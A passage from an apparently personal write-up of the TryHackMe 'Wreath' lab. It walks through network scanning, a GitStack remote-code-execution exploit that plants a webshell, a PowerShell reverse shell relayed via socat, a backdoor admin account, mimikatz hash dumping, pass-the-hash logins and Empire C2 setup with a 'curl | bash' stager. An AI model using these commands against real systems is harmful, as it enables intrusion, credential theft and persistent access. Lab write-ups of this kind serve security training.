</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span>Nmap scan report <span style="color:#fe8019">for</span> ip-10-200-84-250.eu-west-1.compute.internal <span style="color:#fe8019">(</span>10.200.84.250<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span>Host is up <span style="color:#fe8019">(</span>0.0010s latency<span style="color:#fe8019">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span>MAC Address: 02:9C:9D:AF:36:F5 <span style="color:#fe8019">(</span>Unknown<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span>Nmap scan report <span style="color:#fe8019">for</span> ip-10-200-84-200.eu-west-1.compute.internal <span style="color:#fe8019">(</span>10.200.84.200<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span>Host is up.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">20</span><span>Nmap <span style="color:#fe8019">done</span>: <span style="color:#d3869b">256</span> IP addresses <span style="color:#fe8019">(</span><span style="color:#d3869b">5</span> hosts up<span style="color:#fe8019">)</span> scanned in 4.95 seconds
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>root@prod-serv ~<span style="color:#fe8019">]</span><span style="color:#928374;font-style:italic"># ./nmap -p- -iL hosts.txt</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>Starting Nmap 6.49BETA1 <span style="color:#fe8019">(</span> http://nmap.org <span style="color:#fe8019">)</span> at 2023-07-06 22:13 BST
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>Unable to find nmap-services!  Resorting to /etc/services
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>Cannot find nmap-payloads. UDP payloads are disabled.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>Nmap scan report <span style="color:#fe8019">for</span> ip-10-200-84-100.eu-west-1.compute.internal <span style="color:#fe8019">(</span>10.200.84.100<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>Host is up <span style="color:#fe8019">(</span>-0.20s latency<span style="color:#fe8019">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>All <span style="color:#d3869b">65535</span> scanned ports on ip-10-200-84-100.eu-west-1.compute.internal <span style="color:#fe8019">(</span>10.200.84.100<span style="color:#fe8019">)</span> are filtered
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>MAC Address: 02:CE:87:99:87:F5 <span style="color:#fe8019">(</span>Unknown<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>Nmap scan report <span style="color:#fe8019">for</span> ip-10-200-84-150.eu-west-1.compute.internal <span style="color:#fe8019">(</span>10.200.84.150<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span>Host is up <span style="color:#fe8019">(</span>0.00051s latency<span style="color:#fe8019">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span>Not shown: <span style="color:#d3869b">65532</span> filtered ports
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span>80/tcp   open  http
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span>3389/tcp open  ms-wbt-server
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span>5985/tcp open  wsman
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span>MAC Address: 02:FE:34:39:76:4D <span style="color:#fe8019">(</span>Unknown<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">21</span><span>Nmap <span style="color:#fe8019">done</span>: <span style="color:#d3869b">2</span> IP addresses <span style="color:#fe8019">(</span><span style="color:#d3869b">2</span> hosts up<span style="color:#fe8019">)</span> scanned in 713.99 seconds
</span></span></code></pre></div><p>Now that we have a target, we can pivot in.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>sudo sshuttle -r root@10.200.84.200 --ssh-cmd “ssh -i id_rsa” 10.200.84.0/24 -x 10.200.84.200
</span></span></code></pre></div><p>We get a django error page with some routes navigating to the page and can get to the login by going to <code>/gitstack</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span>Page not found <span style="color:#fe8019">(</span>404<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>Request Method: 	GET
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>Request URL: 	http://10.200.84.150/
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>Using the URLconf defined in app.urls, Django tried these URL patterns, in this order:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>    ^registration/login/$
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>    ^gitstack/
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>    ^rest/
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>The current URL, , didn&#39;t match any of these.
</span></span></code></pre></div><p><img src="attachment/e7a3400d56587c689820029edcfb9da5.png" alt=""></p>
<p>Default creds didn&rsquo;t work :(.</p>
<p>But there may be an RCE :).</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">[</span>~/thm/wreath<span style="color:#fe8019">]</span>$ searchsploit gitstack
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>-------------------------------------------------- ---------------------------------
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">3</span><span> Exploit Title                                    |  Path
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">4</span><span>-------------------------------------------------- ---------------------------------
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">5</span><span>GitStack - Remote Code Execution                  | php/webapps/44044.md
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">6</span><span>GitStack - Unsanitized Argument Remote Code Execu | windows/remote/44356.rb
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">7</span><span>GitStack 2.3.10 - Remote Code Execution           | php/webapps/43777.py
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">8</span><span>-------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>By default the exploit just runs <code>whoami</code>, so we will need to put our own payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>~/thm/wreath<span style="color:#fe8019">]</span>$ python 43777.py
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python <span style="color:#d3869b">2</span> is no longer supported by the Python core team. Support <span style="color:#fe8019">for</span> it is now deprecated in cryptography, and will be removed in the next release.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Get user list
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Found user twreath
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Web repository already enabled
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Get repositories list
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Found repository Website
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Add user to repository
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Disable access <span style="color:#fe8019">for</span> anyone
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Create backdoor in PHP
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. &lt;br /&gt;Note : You have to enter the credentials of a user which has at least <span style="color:#fabd2f">read</span> access to your repository. Your GitStack administration panel username/password will not work.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Execute <span style="color:#fabd2f">command</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span><span style="color:#b8bb26">&#34;nt authority\system
</span></span></span></code></pre></div><p>It also uploaded a webshell at <code>POST /web/exploit.php</code> via <code>a=COMMAND</code> in the POST data'</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>curl -X POST http://10.200.84.150/web/exploit.php -d <span style="color:#b8bb26">&#34;a=whoami&#34;</span>
</span></span></code></pre></div><p>From here we can also load into burp repeater to make our lives much, much easier. Lets see if we can connect back to our attack box with a ping.</p>
<pre tabindex="0"><code>a=ping -n 4 10.50.85.139
</code></pre><p>as expected we can&rsquo;t make it back so a shell is not going to be that easy.</p>
<p>we will need to either forward or catch the shell on the other server on this network.</p>
<p>FIrst centos has a very restrictive firewall policy so we will have to open up a port to allow trafiic on 8888 on the gitstack server, and 8888 and 443 on the relay server.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>firewall-cmd --zone<span style="color:#fe8019">=</span>public --add-port 443/tcp
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>firewall-cmd --zone<span style="color:#fe8019">=</span>public --add-port 8888/tcp
</span></span></code></pre></div><p>We have socat on our relay server to relay the traffic back to our nc listener on 443 on our attack box.</p>
<pre tabindex="0"><code>./soca tcp-l:8888  tcp:10.50.85.139:443
</code></pre><p>We can use a PS payload here.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Powershell" data-lang="Powershell"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>powershell.exe -c <span style="color:#b8bb26">&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.200.84.200&#39;,8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34;</span>
</span></span></code></pre></div><p>Now we have a stable shell on the windows box.</p>
<p>For persistence we can add a user.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>net user gabad00 gabad00 /add
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>net localgroup Administrators gabad00 /add
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">3</span><span>net localgroup <span style="color:#b8bb26">&#34;Remote Management Users&#34;</span> gabad00 /add
</span></span></code></pre></div><p>Now we can get in with either RDP or winrm. Here we will use winrm.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>evil-winrm -i 10.200.84.150  -u gabad00 -p <span style="color:#b8bb26">&#39;gabad00&#39;</span>
</span></span></code></pre></div><p>We can also use xfreerdp to rdp in.</p>
<pre tabindex="0"><code>xfreerdp /v:10.200.84.150 /u:gabad00 /p:&#39;gabad00&#39; /dynamic-resolution +clipboard /drive:/home/kali/thm/wreath,kali-share
</code></pre><p>This also mounted a share with all of our tools in it so we can open it up and dump the password hashes with mimikatz.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>\\tsclient\kali-share\tools\Post-Exploitation
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>privilege::debug
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>token::elevate
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">3</span><span>lsadump::sam
</span></span></code></pre></div><p>Now we have various hashes to crack or pass, such as:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.250
</span></span></code></pre></div><h2 id="c2">c2</h2>
<p>We have a solid foothold in the network and can now consolidate our position and try to simplify post exploitation.</p>
<p>We will be using <code>Empire</code> here.</p>
<h4 id="installation">Installation</h4>
<p>Starkiller is the GUI frontend.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>sudo apt install powershell-empire starkiller
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>sudo powershell-empire server
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>sudo powershell-empire client
</span></span></code></pre></div><p>Change the connection info</p>
<pre tabindex="0"><code>/usr/share/powershell-empire/empire/client/config.yaml
</code></pre><p>Connect on another host:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>powershell-empire client connect HOSTNAME --username<span style="color:#fe8019">=</span>USERNAME --password<span style="color:#fe8019">=</span>PASSWORD
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>starkiller - in the empire prompt to start
</span></span></code></pre></div><pre tabindex="0"><code>http://localhost:1337/index.html
</code></pre><pre tabindex="0"><code>empireadmin
password123
</code></pre><h3 id="listeners">Listeners</h3>
<p>Since we can&rsquo;t get to the git server directly, we will need to compromise the web server and add it into empire and pivot from there. The first step in that is a listener.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>uselistener http
</span></span></code></pre></div><p>Similar to metasploit we can set our options from here.</p>
<pre tabindex="0"><code>options
set option VALUE
</code></pre><pre tabindex="0"><code>(Empire: uselistener/http) &gt; set Host 10.50.85.139
INFO: Set Host to 10.50.85.139

(Empire: uselistener/http) &gt; set Port 8000
INFO: Set Port to 8000

(Empire: uselistener/http) &gt; set Name CLIHTTP
INFO: Set Name to CLIHTTP

execute
kill CLIHTTP
</code></pre><h4 id="stagers">Stagers</h4>
<pre tabindex="0"><code>usestager - there should be a white space after this, this will give us a list

multi/launcher is a good bet generally
multi/bash is a good choice here

set listener VALUE 

execute
</code></pre><h2 id="getting-a-callback">Getting a callback</h2>
<p>I saved the stager, hosted it on a simple python server and executed it on the machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>curl http://10.50.85.139/stager.sh | bash
</span></span></code></pre></div><p>Now, we have an agent.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> New agent CVFDEOHD checked in
</span></span></code></pre></div><pre tabindex="0"><code>agents
interact &lt;agent_name&gt;
help
</code></pre><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">(</span>Empire: agents<span style="color:#fe8019">)</span> &gt; interact CVFDEOHD
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span><span style="color:#fe8019">(</span>Empire: CVFDEOHD<span style="color:#fe8019">)</span> &gt; shell whoami
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">3</span><span>INFO: Tasked CVFDEOHD to run Task <span style="color:#d3869b">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">4</span><span><span style="color:#fe8019">[</span>*<span style="color:#fe8019">]</span> Task <span style="color:#d3869b">1</span> results received
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">5</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">6</span><span><span style="color:#fe8019">(</span>Empire: CVFDEOHD<span style="color:#fe8019">)</span> &gt; shell id
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">7</span><span>INFO: Tasked CVFDEOHD to run Task <span style="color:#d3869b">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">8</span><span><span style="color:#fe8019">[</span>*<span style="color:#fe8019">]</span> Task <span style="color:#d3869b">2</span> results received
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">9</span><span>uid<span style="color:#fe8019">=</span>0<span style="color:#fe8019">(</span>root<span style="color:#fe8019">)</span> gid<span style="color:#fe8019">=</span>0<span style="color:#fe8019">(</span>root<span style="color:#fe8019">)</span> groups<span style="color:#fe8019">=</span>0<span style="color:#fe8019">(</span>root<span style="color:#fe8019">)</span> context<span style="color:#fe8019">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></span></code></pre></div><p>We can use <code>back</code> to exit the interaction.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">(</span>Empire: agents<span style="color:#fe8019">)</span> &gt; rename CVFDEOHD WEB1
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>INFO: Agent successfully renamed to WEB1
</span></span></code></pre></div><h3 id="gitting-to-the-git">Gitting to the Git</h3>
<p>We are going to want to use the hop listener to get to the server that we want to get to here</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>uselistener http_hop
</span></span></code></pre></div><p>The big difference here is that we need a redirect listener.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> Host
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> Host 10.50.85.139
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>INFO: Set Host to 10.50.85.139
